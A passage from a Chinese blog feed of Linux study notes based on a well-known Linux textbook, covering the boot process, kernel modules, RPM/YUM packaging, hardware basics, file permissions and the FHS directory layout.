plymouth指令来传递动画与信息</li><li>日志式登录文件的使用,就是<code>systemd-journald</code>这个服务的启动</li><li>载入额外的核心模块</li><li>载入额外的核心参数设置</li><li>启动系统的乱数产生器</li><li>设置终端机(console)字形</li><li>启动动态设备管理员,即<code>udevd</code></li></ul><p><code>basic.target</code> 的阶段主要启动的服务大概有这些</p><ul><li>载入 alsa 音效驱动程序</li><li>载入 firewall 防火墙</li><li>载入 COU 的微指令功能</li><li>启动与设置 SELinux 的安全文本</li><li>将目前的开机过程所产生的开机信息写入<code>/var/log/dmesg</code></li><li>载入systemd 支持的timer 功能</li></ul><hr><p><strong>核心与核心模块</strong></p><p>核心一般都是压缩文件,因此使用核心之前需要将它解压缩后,才能载入内存当中,为了应付日新月异的硬件，目前的核心都是具有“可读取模块化驱动程序”的功能,就是所谓的modules 模块化的功能啦.</p><p>核心 <code>/boot/vmlinuz</code> 或 <code>/boot/vmlinuz-version</code></p><p>核心解压缩所需 RAM Disk <code>/boot/initramfs (/boot/initramfs-version)</code></p><p>核心模块 <code>/lib/modules/version/kernel</code> 或 <code>/lib/module/$(uname -r) /kernel</code></p><p>核心源代码 <code>/usr/src/linux</code> 或 <code>/usr/src/kernels/</code> (默认不安装)</p><p>核心版本 <code>/proc/version</code></p><p>系统核心功能 <code>/proc/sys/kernel/</code></p><p>kernel 核心模块扩展名一定是<code>.ko</code>结尾的</p><p>使用<code>lsmod</code> 查询目前核心载入了多少模块</p><p>使用<code>modprobe</code> 这个指令来载入模块,这是因为<code>modprobe</code>会主动的去搜寻<code>modules.dep</code>的内容</p><p>使用<code>rmmod [-fw] module_name</code> 来移除模块</p><p><code>-f</code> 强制将该模块移除掉,不论是否正则被使用</p><p>在<code>/etc/modprobe.d/*conf</code>文件中修改核心模块的额外参数设置</p><hr><p>Linux 将boot loader 的程序码执行与设置值载入分成两个阶段来执行</p><p>Stage 1：执行 boot loader 主程序： 第一阶段为执行 boot loader 的主程序，这个主程序 必须要被安装在开机区，亦即是 MBR 或者是 boot sector 。但如前所述，因为 MBR 实 在太小了，所以，MBR 或 boot sector 通常仅安装 boot loader 的最小主程序， 并没有安装 loader 的相关配置文件； </p><p>Stage 2：主程序载入配置文件： 第二阶段为通过 boot loader 载入所有配置文件与相关的环境参数文件 （包括文件系统定义与主要配置文件 grub.cfg）， 一般来说，配置文件都在 /boot 下面。</p><p>grub2的配置文件<code>/boot/grub2/grub.cfg</code></p><p><img src="https://i.loli.net/2020/02/03/lmSQhG76fLD2FkZ.png" alt></p><h1 id="0x20-基础系统设置与备份策略"><a href="#0x20-基础系统设置与备份策略" class="headerlink" title="0x20    基础系统设置与备份策略"></a>0x20    基础系统设置与备份策略</h1><p>使用<code>ntpdate</code> 手动网络校时</p><p>备份的要点</p><p><img src="https://i.loli.net/2020/02/04/viosrWImeRlCGOd.png" alt></p><h1 id="0x21-软件安装-源代码与-Tarball"><a href="#0x21-软件安装-源代码与-Tarball" class="headerlink" title="0x21    软件安装: 源代码与 Tarball"></a>0x21    软件安装: 源代码与 Tarball</h1><p>使用<code>make</code> 进行宏编译</p><p>静态函数库 <code>扩展名为.a</code> 动态函数库<code>扩展名为.so</code></p><p><img src="https://i.loli.net/2020/02/04/4LBGbwC29AWtQX7.png" alt></p><h1 id="0x22-软件安装-RPM-SRPM-与-YUM"><a href="#0x22-软件安装-RPM-SRPM-与-YUM" class="headerlink" title="0x22    软件安装 RPM,SRPM 与 YUM"></a>0x22    软件安装 RPM,SRPM 与 YUM</h1><p>目前Linux 软件安装方式最常见的有两种</p><p><code>dpkg</code> </p><p>这个机制最早是由 Debian Linux 社群所开发出来的，通过 dpkg 的机制，Debian 提供的软件就能够简单的安装起来，同时还能提供安装后的软件信息，实在非常不错。 只要是衍生于 Debian 的其他 Linux distributions 大多使用 dpkg 这个机制来管理软件的， 包括 B2D, Ubuntu 等</p><p><code>RPM</code> </p><p>这个机制最早是由 Red Hat 这家公司开发出来的，后来实在很好用，因此很多distributions 就使用这个机制来作为软件安装的管理方式。包括 Fedora, CentOS, SuSE等等知名的开发商都是用这</p><p>RPM的全名是”RedHat Package Manager” RPM 是以一种数据库记录的方式来将你所需要的软件安装到你的 Linux 系统的一套管理机制</p><hr><p>本章重点</p><ul><li>为了避免使用者自行编译的困扰，开发商自行在特定的硬件与操作系统平台上面预先编译好软件， 并将软件以特殊格式封包成文件，提供终端用户直接安装到固定的操作系统上，并提供简单的查询/安装/移除等流程。 此称为软件管理员。常见的软件管理员有RPM 与 DPKG 两大主流。 </li><li>RPM 的全名是 RedHat Package Manager，原本是由 Red Hat 公司所发展的，流传甚广；</li><li>RPM 类型的软件中，所含有的软件是经过编译后的 binary program ，所以可以直接安装 </li><li>在使用者端的系统上， 不过，也由于如此，所以 RPM 对于安装者的环境要求相当严格；</li><li>RPM 除了将软件安装至使用者的系统上之外，还会将该软件的版本、名称、文件与目录配置、系统需求等等均记录于数据库 （/var/lib/rpm） 当中，方便未来的查询与升级、移 </li><li>除；</li><li>RPM 可针对不同的硬件等级来加以编译，制作出来的文件可于扩展名 （i386, i586, i686,x86_64, noarch） 来分辨； </li><li>RPM 最大的问题为软件之间的相依性问题； </li><li>SRPM 为 Source RPM ，内含的文件为 Source code 而非为 binary file ，所以安装SRPM 时还需要经过 compile ，不过，SRPM 最大的优点就是可以让使用者自行修改设置参数 （makefile/configure 的参数） ，以符合使用者自己的 Linux 环境； </li><li>RPM 软件的属性相依问题，已经可以借由 yum 或者是 APT 等方式加以克服。 CentOS使用的就是 yum 机制。 </li><li>yum 服务器提供多个不同的软件库放置个别的软件，以提供用户端分别管理软件类别。</li></ul><h1 id="0x23-X-Window-设置介绍"><a href="#0x23-X-Window-设置介绍" class="headerlink" title="0x23    X Window 设置介绍"></a>0x23    X Window 设置介绍</h1><p>Linux 上的图形接口,称为 X Window System,简称 X 或 X11</p><p>Unix Like 操作系统不是只能进行服务器的架设而已，在美编、排版、制图、多媒体应用上也是有其需要的。 这些需求都需要用到图形接口 （Graphical User Interface, GUI） 的操作的， 所以后来才有所谓的 X Window System 这玩意儿</p><p><img src="https://i.loli.net/2020/02/04/BQueNAmIR7tjV2y.png" alt></p><p><img src="https://i.loli.net/2020/02/04/4gkuAjTXSePtxIf.png" alt></p><p><img src="https://i.loli.net/2020/02/04/wv96PVMzSYjf3oG.png" alt="本章重点"></p><h1 id="0x24-Linux-核心编译与管理"><a href="#0x24-Linux-核心编译与管理" class="headerlink" title="0x24    Linux 核心编译与管理"></a>0x24    Linux 核心编译与管理</h1><p><img src="https://i.loli.net/2020/02/04/kCcMNPLmy7Fa5qg.png" alt></p><hr><p>后面这些内容我觉得对于我们搞安全的,了解一下,知道有哪些命令,是干什么的,到时候需要的时候就去查一下用法就行了.</p>]]></content>
      
      
      <categories>
          
          <category> 操作系统 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux 操作系统学习笔记(上)</title>
      <link href="/posts/20200201/"/>
      <url>/posts/20200201/</url>
      
        <content type="html"><![CDATA[<p>本篇笔记内容均摘自<strong>鸟哥的Linux私房菜基础篇第四版</strong>,以及个人在使用Kali Linux的一些心得,其实有一些东西之前用kali 慢慢用着就知道了,只是想利用一下寒假系统学习一下一个操作系统.</p><h1 id="0x00-计算机概论"><a href="#0x00-计算机概论" class="headerlink" title="0x00    计算机概论"></a>0x00    计算机概论</h1><h2 id="About-computer"><a href="#About-computer" class="headerlink" title="About computer"></a>About computer</h2><blockquote><p><strong>电脑</strong></p></blockquote><p>所谓的电脑就是一种计算机,而计算机是: <strong>接受用户输入的命令和数据,经过中央处理器的算术和逻辑单元运算处理后,产生或存储成有用的信息</strong></p><p>电脑又三部分组成: </p><ul><li>输入单元: 键盘鼠标等</li><li>主机部分: CPU 主板等</li><li>输出单元: 屏幕 打印机等</li></ul><p>其实把自己家里的台式拆开看一下就知道了有什么东西了,谁还没有幻想过拥有一台游戏主机了???</p><p><img src="https://i.loli.net/2020/02/01/ilLIU8pVeoPaszG.png" alt></p><blockquote><p><strong>CPU    架构</strong></p></blockquote><p>主要有两种: 精简指令集(RISC) 和复杂指令集(CISC),二者的区别在于指令.</p><p>RISC , 微指令集较为精简，每个指令的执行时间都很短，完成的动作也很单 </p><p>纯，指令的执行性能较佳； 但是若要做复杂的事情，就要由多个指令来完成。</p><p>CISC, 微指令集的每个小指令可以执行一些较低阶的硬件操作，指令数目多 </p><p>而且复杂， 每条指令的长度并不相同。因为指令执行较为复杂所以每条指令花费的时间较 </p><p>长， 但每条个别指令可以处理的工作较为丰富。</p><p>关于<code>x86</code>,这是因为最早的Intel发展的CPU代号为<code>8086</code>,后来依据这个架构开发了<code>80286</code>…因此这种架构的COU就被称为<code>x86</code></p><p>关于<code>位</code>,指的是CPU一次数据读取的最大量！64位CPU代表CPU一次可以读写64bits这 么多的数据，32位CPU则是CPU一次只能读取32位的意思。 因为CPU读取数据量有限制，因 此能够从内存中读写的数据也就有所限制。所以，一般32位的CPU所能读写的最大数据量， 大概就是4GB左右。</p><p>CPU 的等级</p><p>32位CPU就称为i686等级。 至于目前的64位CPU则统称为x86_64等级</p><blockquote><p><strong>电脑上常用的计算单位</strong></p></blockquote><p>0/1 这个二进制的的单位我们称为 bit。 但 bit 实在太小了，所以在储 存数据时每份简单的数据都会使用到 8 bits 的大小来记录，因此定义出 Byte 这个单位，他 们的关系为： </p><blockquote><p><strong>1 Byte = 8 bits</strong> </p></blockquote><p><img src="https://i.loli.net/2020/02/01/jkTVCEu6RPKiQsb.png" alt="单位表"></p><p>CPU的<strong>运算速度</strong>常使用 MHz 或者是 GHz 之类的单位，这个 Hz 其实就是秒分之一。而在<strong>网络传输</strong>方面，由于网络使用的是 bit 为单位，因此网络常使用的单位为 Mbps 是 Mbits per second，亦即是每秒多少 Mbit.</p><blockquote><p><strong>Intel    芯片架构</strong></p></blockquote><p>早期的芯片组通常分为两个桥接器来控制各元件的沟通， 分别是： </p><p>（1）北桥：负责链接速度较快的CPU、内存与显卡接口等元件</p><p>（2）南桥：负责连接速度较慢的设备接口， 包括硬盘、USB、网卡等</p><blockquote><p>北桥最重要的就是 CPU 与内存之间的桥接，因此目前的主流架构中，大多将北桥内存控制器整合到 CPU 封装当中了</p></blockquote><p>不同的CPU型号大多具有不同的脚位（CPU上面的插脚），能够搭配的主板芯片组也不同</p><blockquote><p><strong>CPU    的工作频率</strong></p></blockquote><p>早期的 CPU 架构主要通过北桥来链接系统最重要的 CPU、内存与显卡设备。因为所有的设 备都得通过北桥来链接，因此每个设备的工作频率应该要相同。 于是就有所谓的前端总线 （FSB） 这个东西的产生。但因为 CPU 的运算速度比其他的设备都要来的快，又为了要满足 FSB 的频率，因此厂商就在 CPU 内部再进行加速， 于是就有所谓的外频与倍频了。 </p><p>总结来说，在早期的 CPU 设计中，所谓的外频指的是CPU与外部元件进行数据传输时的速 度，倍频则是 CPU 内部用来加速工作性能的一个倍数， 两者相乘才是CPU的频率速度。例 如 Intel Core 2 E8400 的内频为 3.0GHz，而外频是333MHz，因此倍频就是9倍</p><p>超频指的是： 将CPU的倍频或者是外频通 <strong>过主板的设置功能</strong>更改成较高频率的一种方式</p><blockquote><p><strong>超线程 （Hyper-Threading, HT）</strong> </p></blockquote><p>在每一个 CPU 内部将重要的寄存器 （register） 分成两群， 而让程序分别使用这两群寄存器。也就是说，可以有两个程序“同时竞争 CPU 的运算单元”，而非通过操作系统的多任务切换.</p><blockquote><p><strong>内存</strong></p></blockquote><p>CPU所使用的数据都是来自于内存（main memory），不论是软件程序还是数据，都必须要读入内存后CPU才能利用。 个人电脑的内存主要元件为动态随机存取内存 （Dynamic Random Access Memory, DRAM），随机存取内存只有在通电时才能记录与使 用，断电后数据就消失了。因此我们也称这种RAM为挥发性内存</p><p>DDR是所谓的双倍数据传送速度（Double Data Rate）， 他可以在一次工作周期中进行两次数据的传送,比如我们现在电脑上的DDR4 2666等</p><p><img src="https://i.loli.net/2020/02/01/ifaKZ3SuN8oMpCA.png" alt></p><blockquote><p><strong>多通道设计</strong></p></blockquote><p>由于所有的数据都必须要存放在内存，所以内存的数据宽度当然是越大越好。 但传统的总线宽度一般大约仅达64位，为了要加大这个宽度，因此芯片组厂商就将两个内存汇整在一起，如果一支内存可达64位，两支内存就可以达到128位了，这就是<strong>双通道</strong>的设计理念。</p><p>板载内存的痛苦?谁能知道?</p><blockquote><p><strong>只读存储器(ROM)</strong></p></blockquote><p>BIOS（Basic Input Output System）是一套程序，这套程序是写 死到主板上面的一个内存芯片中， 这个内存芯片在没有通电时也能够将数据记录下来，那就 是只读存储器（Read Only Memory, ROM）。 ROM是一种非挥发性的内存。</p><p>BIOS 对电脑系统来讲是非常重要的，因为他掌握了系统硬件的详细信息与开机设备的选择等 </p><blockquote><p><strong>显卡</strong></p></blockquote><p>显卡又称为<strong>VGA（Video Graphics Array）</strong>他对于图形影像的显示扮演相当关键的角色。 一 般对于图形影像的显示重点在于分辨率与色彩深度，因为每个图像显示的颜色会占用掉内 存,因此显卡上面会有一个内存的容量，这个显存容量将会影响到你的屏幕分辨率与色彩深 度</p><p><img src="https://i.loli.net/2020/02/01/rvtqd4McTNSY2Xj.png" alt="不同插槽的带宽"></p><p>比较特殊的是，PCIe（PCI-Express）使用的是类似管线的概念来处理，在 PCIe 第一版（PCIe 1.0） 中，每条管线可以具有250MBytes/s的带宽性能， 管线越多（通常设计到x16 管线）则总带宽越高</p><p><img src="https://i.loli.net/2020/02/01/9v8yUbQxHuLV2Xe.png" alt></p><p>当然,显存还是越大越好</p><p>显卡的连接接口</p><p><img src="https://i.loli.net/2020/02/01/2DMCQ9FqdXuW6yb.png" alt></p><blockquote><p><strong>硬盘与存储设备</strong></p></blockquote><p>电脑系统上面的储存设备包括有：硬盘、软盘、MO、CD、 DVD、磁带机、U盘（闪存）、还有新一代的蓝光光驱等， 乃至于大型机器的区域网络储存设备（SAN, NAS）等等，都是可以用来储存数据的</p><blockquote><p><strong>主板</strong></p></blockquote><p><strong>CMOS与BIOS</strong></p><p>CMOS主要的 功能为记录主板上面的重要参数， 包括系统时间、CPU电压与频率、各项设备的I/O位址与 IRQ等，由于这些数据的记录要花费电力，因此主板上面才有电池。 BIOS为写入到主板上某 一块 flash 或 EEPROM 的程序，他可以在开机的时候执行，以载入CMOS当中的参数， 并尝 试调用储存设备中的开机程序，进一步进入操作系统当中。BIOS程序也可以修改CMOS中的 数据， 每种主板调用BIOS设置程序的按键都不同，一般台式机常见的是使用[del]按键进入BIOS设置画面。 </p><p><strong>各种周边设备接口</strong></p><p>PS/2 接口: 原来是用来连接键盘和鼠标的接口,现在已被USB接口取代,几乎已经消失</p><p>USB 接口: 蓝色为USB 3.0, 其他为USB 2.0</p><p>声音输出,输入与麦克风: 圆形插口</p><p>RJ-45网络头: 就是我们说的插网线的网口</p><p>HDMI: 就是连接扩展显示器的</p><p><img src="https://i.loli.net/2020/02/01/8AuaeXhI9PxiH7k.png" alt></p><p><strong>设备I/O位址与IRQ中断信道</strong></p><p>I/O位址有点类似每个设备的门牌号码，每个设备都有他自己的位址，一般来说，不能有两个 设备使用同一个I/O位址， 否则系统就会不晓得该如何运行这两个设备了。而除了I/O位址之外，还有个IRQ中断(Interrupt)</p><p>如果I/O位址想成是各设备的门牌号码的话,那么IRQ就可以想成是各个门牌连接到邮件中心 （CPU）的专门路径.各设备可以通过IRQ中断信道来告知CPU该设备的工作情况，以方便CPU进行工作分配的任务</p><blockquote><p><strong>电源</strong></p></blockquote><p>现在一般都是装500W的了,判断电源的好坏还是用料,稳定的,低能耗的电源就好</p><h2 id="About-data-representation"><a href="#About-data-representation" class="headerlink" title="About data representation"></a>About data representation</h2><blockquote><p>Digital system</p></blockquote><p>早期的电脑使用的是利用通电与否的特性的真空管，如果通电就是1，没有通电就是0.后来沿用至今，我们称这种只有0/1的环境为二进制制，英文称为binary.</p><p>十进制<br>$$<br>3456=3<em>10^3+4</em>10^2+5<em>10^1+6</em>10^0<br>$$<br>二进制<br>$$<br>1101010=1<em>2^6+1</em>2^5+0<em>2^4+1</em>2^3+0<em>2^3+1</em>2^2+0*2^0<br>$$</p><blockquote><p>Text encoding system</p></blockquote><p>实际上文字的”编码系统”实际就是一个”字码对照表”.当我们要写入文件的文字数据时，该文字数据会由编码对照表将该文字转成数字后，再存入 文件当中。 同样的，当我们要将文件内容的数据读出时，也会经过编码对照表将该数字转成对应的文字后再显示到屏幕上。</p><p>常用的英文编码表为ASCII系统，这个编码系统中， 每个符号（英文、数字或符号等）都会占 用1Bytes的记录， 因此总共会有<code>2^8=256</code>种变化。至于中文字当中的编码系统早期最常用的就 big5这个编码表了。 每个中文字会占用2Bytes，理论上最多可以有<code>2^16=65536</code>，亦即最多 可达6万多个中文字。 但是因为big5编码系统并非将所有的位都拿来运用成为对照，所以并非 可达这么多的中文字码的。 目前big5仅定义了一万三千多个中文字，很多中文利用big5是无成功显示的</p><p>为了解决这些问题,ISO/IEC指定了 <code>Unicode</code>编码系统.也就是<code>UTF-8</code></p><h2 id="Operating-System"><a href="#Operating-System" class="headerlink" title="Operating System"></a>Operating System</h2><blockquote><p>操作系统（Operating System, OS）其实也是一组程序，这组程序的重点在于管理电脑的所有活动以及驱动系统中的所有硬件</p></blockquote><p>电脑没有软件只是一堆废铁，那么操作系 统的功能就是让CPU可以开始判断逻辑与运算数值、 让内存可以开始载入/读出数据与程序码,让硬盘可以开始被存取,让网卡可以开始传输数据,让所有周边可以开始运行等</p><p>上述功能就是操作系统的核心(<strong>Kernel</strong>),核心决定了电脑能不能做哪些事情!～因为核心主要在管控硬件与提供相关的能力 （例如存取硬盘、网络功能、CPU资源取得等）， 这些管理的动作是非常的重要的，如果使 用者能够直接使用到核心的话，万一使用者不小心将核心程序停止或破坏， 将会导致整个系 统的崩溃！因此核心程序所放置到内存当中的区块是受保护的,并且开机后就一直<strong>常驻在内存</strong>当中</p><blockquote><p>系统调用(System Call)</p></blockquote><p>举例来说，我们学习C程序语言只要参考C程序语言的函数即可，不需要再去考虑其他核心的相关功能，因为核心的系统调用接口会主动的将 C程序语言的相关语法转成核心可以了解的任务函数，那核心自然就能够顺利运行该程序了</p><p><img src="https://i.loli.net/2020/02/01/m9pSaPWb4qkIYgh.png" alt></p><p>电脑系统主要由硬件构成，然后核心程序主要在管理硬件，提供合理的电脑系统资源分配 （包括CPU资源、内存使用资源等等）， 因此只要硬件不同（如x86架构与RISC架构的 CPU）核心就得要进行修改才行。</p><p>为了保护核心，并且让程序设计师比较容易开发软件，因此操作系统除了核心程序之外，通常还会提供一整组开发接口,那就是<strong>系统调用层</strong></p><p>核心主要是在负责整个电脑系统相关的资源分配与管理，那我们知道其实整部电脑系统最重要的就是CPU与内存， 因此，核心至少也要有这些功能的: </p><ul><li>系统调用接口</li><li>程序管理</li><li>内存管理</li><li>文件系统管理</li><li>设备驱动</li></ul><blockquote><p>操作系统与硬件的关系</p></blockquote><p><img src="https://i.loli.net/2020/02/01/APLDeQ4rgwMHzRV.png" alt></p><blockquote><p>应用程序</p></blockquote><p>应用程序是参考操作系统提供的开发接口所开发出来软件，这些软件可以让使用者操作，以 达到某些电脑的功能利用。 举例来说，办公室软件（Office）主要是用来让使用者办公用的.影像处理软件主要是让使用者用来处理影音数据的； 浏览器软件主要是让使用者用来上网浏览用的等等</p><p><strong>第0章计算机概论的重点</strong></p><p><img src="https://i.loli.net/2020/02/01/1nTaRfyjLYHSBzr.png" alt></p><p>em这部分<strong>了解</strong>一下就行了</p><h1 id="0x01-Linux是什么与如何学习"><a href="#0x01-Linux是什么与如何学习" class="headerlink" title="0x01    Linux是什么与如何学习"></a>0x01    Linux是什么与如何学习</h1><p>  <strong>Linux 是由 Torvalds 这个芬兰人所发明的</strong></p><p> 鸟哥主要就介绍了一些历史,这里我看了,我了解了一下,就想我们会用Windows一样,不一定需要懂太多历史吧?Linux历史悠久(起初并不叫作Linux),最开始的时候也需要买光盘,但是源码是给了的,这一些构成了Linux open source的理念,并且Linux的核心是C写的,可移植性强,也叫谋生了多种比如现在的各种Linux系统</p><p>GNU’s Not Unix = GNU</p><p><strong>GNU C Compiler(gcc)</strong>.</p><p>Linux这个名字的由来是,因为托瓦兹放置核心的那个FTP 网站的目录为：Linux， 从此，大家便称这个核心为Linux了。</p><blockquote><p><strong>Linux的核心版本</strong></p></blockquote><blockquote><p>3.10.0-123.el7.x86_64 </p><p>主版本.次版本.释出版本-修改版本</p></blockquote><p>Cent0S 这些叫做 distribution</p><p><img src="https://i.loli.net/2020/01/27/2vxYurfpgqnBEeA.png" alt="本章重点"></p><h1 id="0x02-主机规划与磁盘分区"><a href="#0x02-主机规划与磁盘分区" class="headerlink" title="0x02    主机规划与磁盘分区"></a>0x02    主机规划与磁盘分区</h1><p><code>/dev</code>表示各种硬件设备的文件</p><p><img src="https://i.loli.net/2020/01/28/CXuUdpslmn9YxIV.png" alt="其他硬件的文件名"></p><p><img src="https://i.loli.net/2020/01/28/5haApjtH6KLS81y.png" alt="目录树结构"></p><p><img src="https://i.loli.net/2020/01/28/BjzFf4EebU9vhWm.png" alt></p><p><img src="https://i.loli.net/2020/01/28/drz2xTMQ1Vu49XU.png" alt="挂载"></p><p><strong>NAT</strong>(达成IP分享器的功能), <strong>SAMBA</strong>(加入Windows网络上的芳邻)</p><p><strong>Mail</strong>(邮件服务器),<strong>Web</strong>(WWW服务器), <strong>DHCP</strong>(提供用户端自动取得IP的功能)</p><p><strong>FTP</strong>(文件传输协议)</p><p><img src="https://i.loli.net/2020/01/28/YinDLfhNuCmt3qd.png" alt="本章重点"></p><h1 id="0x03-安装"><a href="#0x03-安装" class="headerlink" title="0x03    安装"></a>0x03    安装</h1><p>看了一眼大概内容,直接跳过了,因为咋们是用的kali.</p><p><a href="http://hack-for.fun/2020/01/06/%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B%E4%BB%A5%E5%8F%8A%E8%A7%A3%E5%86%B3%E9%94%90%E6%8D%B7%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%AF%BC%E8%87%B4%E7%9A%84%E6%97%A0%E6%B3%95%E4%B8%8A%E7%BD%91/">安装Kali我之前帮我的同学写过一篇文章</a></p><h1 id="0x04-首次登陆与线上求助"><a href="#0x04-首次登陆与线上求助" class="headerlink" title="0x04    首次登陆与线上求助"></a>0x04    首次登陆与线上求助</h1><p><strong>Tab</strong>键的作用: </p><ul><li>[Tab] 接在一串指令的第一个字的后面，则为“命令补全”</li><li>[Tab] 接在一串指令的第二个字以后时，则为“文件补齐”</li><li>若安装 bash-completion 软件，则在某些指令后面使用 [tab] 按键时，可以进行“选项/参数的补齐”功能</li></ul><p><code>Ctrl-c</code> 中断正在运行中的指令 这种按键 称为 <code>组合键</code> </p><p><code>Ctrl-d</code>相当于输入<code>exit</code>,表示直接离开命令行</p><p><code>shift+{PageUp/Down}</code>翻滚屏幕画面,即浏览本页看不到的内容时可以使用</p><p><code>man -f xxx</code>匹配xxx的手册</p><p><img src="https://i.loli.net/2020/01/28/SrMx8VeZnlFPOJu.png" alt="在man age中常用的按键"></p><p><code>info</code>指令,info与man的用途其实差不多，都是用来查询指令的用法或者是文件的格式.但是info page是将文件数据拆成一个一个的段落,每个段落用自己的页面来撰写</p><p>em,….我在kali上试了没用<code>info</code> ..233 直接跳过</p><p><code>nano</code>,超简单文书编辑器</p><p><code>正确的关机方法</code> ,使用<code>shutdown</code>和<code>reboot</code>指令</p><p>将数据同步写入硬盘中的指令<code>sync</code>,关机<code>shutdown</code>重新开机<code>reboot</code>,<code>halt</code>,<code>poweroff</code></p><p><img src="https://i.loli.net/2020/01/28/KtyG94QdDsZ52W3.png" alt="第四章重点"></p><h1 id="0x05-Linux的文件权限与目录配置"><a href="#0x05-Linux的文件权限与目录配置" class="headerlink" title="0x05    Linux的文件权限与目录配置"></a>0x05    Linux的文件权限与目录配置</h1><p>使用<code>ls -al</code>,可以列出所有文件详细的<strong>权限与属性</strong>(包含隐藏文件,即以”.”为第一个字符的文件),就比如</p><pre><code>drwxr-xr-x  4 root root    4096 12月  7 23:35  webdirscan</code></pre><p>分别表示的意思是</p><pre><code>拥有的权限, 连接数 , 拥有者, 所属群组, 容量大小, 最后修改日期, 名称</code></pre><p><img src="https://i.loli.net/2020/01/28/DIYiygwsFeu1ELd.png" alt></p><p><code>rwx</code>为三个参数的组合,<code>r</code>代表可读(<strong>read</strong>),<code>w</code>代表可写(<strong>write</strong>),<code>x</code>代表可执行(<strong>execute</strong>)</p><ul><li>r （Read）：可读取此一文件的实际内容，如读取文本文件的文字内容等； </li><li>w （Write）：可以编辑、新增或者是修改该文件的内容（但不含删除该文件）； </li><li>x （eXecute）：该文件具有可以被系统执行的权限。在Linux中一个文件能否被执行,是通过有无”x”这个权限而不是后缀名</li></ul><p><code>chgrp</code>改变文件<strong>所属群组</strong>, <code>chown</code>改变文件<strong>拥有者</strong>, <code>chmod</code>改变文件的<strong>权限</strong></p><p>这些指令都是<code>change+名词</code>的缩写</p><blockquote><p>数字类型改变文件权限</p></blockquote><p><code>r</code>&gt;&gt;4 , <code>w</code>&gt;&gt;2, <code>x</code>&gt;&gt;1</p><p>rwx = 4+2+1 = 7 ,经常会用到的比如 <code>chmod 775 xxx.sh</code></p><p>用符号修改权限. <code>u&gt;user,g&gt;group,o&gt;others,a&gt;all</code></p><p><code>chmod u=rwx,go=rx</code></p><p>目录主要的内容在<strong>记录文件名清单</strong></p><p><img src="https://i.loli.net/2020/01/28/4zkTObWYGmfrjHs.png" alt="目录相应的权限功能"></p><p><code>-</code>指一般文件, <code>d</code>指目录文件</p><p><code>ASCII</code> 纯文本文件,<code>binary</code>二进制档,<code>data</code>数据格式文件</p><p><strong>数据格式文件</strong></p><p>有些程序在运行的过程当中会读取某些特定格式的文件， 那些特定格式的文件可以被称为数据文件 （data file）,比如登录Linux时,<code>/var/log/xxx</code>这个文件就是data file</p><p>目录(directory) , 第一个属性为<code>d</code>;链接文件(link),第一个属性为<code>l</code></p><p>设备与设备文件(device), 与系统周边及储存等相关的一些文件,通常集中在<code>/dev</code>这个目录下,通常又分为两种, <strong>区块</strong>(block)设备文件, 就是一些储存数据,第一个属性为<code>b</code>.</p><p><strong>字符</strong>设备文件, 就是一些串行口的周边设备,如有键盘鼠标等第一个属性为<code>c</code></p><p><strong>数据接口</strong>文件(sockets) 第一个属性为<code>s</code> 最常在<code>/run</code>或<code>tmp</code></p><p><strong>数据输送档</strong>(FIFO,pipe),<strong>FIFO</strong> ,是一种特殊的文件类型,主要的目的在解决多个 程序同时存取一个文件所造成的错误问题。 FIFO是first-in-first-out的缩写。第一个属性为<code>p</code></p><p> Linux文件扩展名, 基本上,Linux的文件是没有所谓的”扩展名”的</p><ul><li>*.sh ： 脚本或批处理文件 （scripts），因为批处理文件为使用shell写成的，所以扩展名 就编成 .sh 啰； </li><li><em>Z,</em> .tar, <em>.tar.gz,</em> .zip, *.tgz： 经过打包的压缩文件。这是因为压缩软件分别为 gunzip, tar 等等的，由于不同的压缩软件，而取其相关的扩展名啰！ </li><li><em>.html,</em> .php：网页相关文件，分别代表 HTML 语法与 PHP 语法的网页文件啰！ .html 的 文件可使用网页浏览器来直接打开，至于 .php 的文件， 则可以通过 client 端的浏览器来 server 端浏览，以得到运算后的网页结果</li></ul><p>Linux<strong>文件长度限制</strong> </p><blockquote><p>单一文件或目录的最大容许文件名为 255Bytes，以一个 ASCII 英文占用一个 Bytes 来 说，则大约可达 255 个字符长度。若是以每个中文字占用 2Bytes 来说， 最大文件名就 是大约在 128 个中文字符</p></blockquote><p><strong>Linux目录配置</strong>的依据 <strong>FHS</strong>, 即Filesystem Hierarchy Standard</p><blockquote><p>主要目的是希望让使用者可以了解到已安装软件通常放 置于那个目录下， 所以他们希望独立的软件开发商、操作系统制作者、以及想要维护系统的使用者,都能够遵循FHS的标准.</p></blockquote><p><img src="https://i.loli.net/2020/01/29/1AjqFaOWl9u2kbB.png" alt></p><p>FHS针对目录树架构仅定义出三层目录下面应该放置什么数据而已</p><ul><li>/ （root, 根目录）：与开机系统有关； </li><li>/usr （unix software resource）：与软件安装/执行有关； </li><li>/var （variable）：与系统运行过程有关。</li></ul><hr><blockquote><p><strong>根目录(/)</strong>的意义与内容</p></blockquote><p>根目录是整个系统最重要的一个目录，因为不但所有的目录都是由根目录衍生出来的,同时根目录也与开机/还原/系统修复等动作有关</p><p>根目录下 FHS <strong>要求必须</strong>存在的目录有: </p><p>即第一层</p><p><code>/bin</code></p><p>/bin放置的是在 单人维护模式下还能够被操作的指令。 在/bin下面的指令可以被root与一般 帐号所使用，主要有：<strong>cat, chmod, chown, date, mv, mkdir, cp, bash</strong>等等常用的指令</p><hr><blockquote><p><strong>/usr</strong> 的意义与内容</p></blockquote><p>依据FHS的基本定义，/usr里面放置的数据属于可分享的与不可变动的（shareable,static）</p><p>第一部分</p><p>usr是<strong>Unix Software Resource</strong>的缩写， 也就 是“Unix操作系统软件资源”所放置的目录,这个目录和Windows系统上的<code>C:\\Windows\+C:\Program files\</code>这两个目录的综合体</p><p><code>/usr/bin/</code></p><blockquote><p>所有一般用户能够使用的<strong>指令</strong>都放在这里.目前新的 CentOS 7 已经将全部的使用者指令放置于此，而使用<strong>链接文件的方式将 /bin 链接至此</strong>也就是说， /usr/bin 与 /bin 是一模一样了.另外，FHS 要求在此目录下不应该有子目录！ 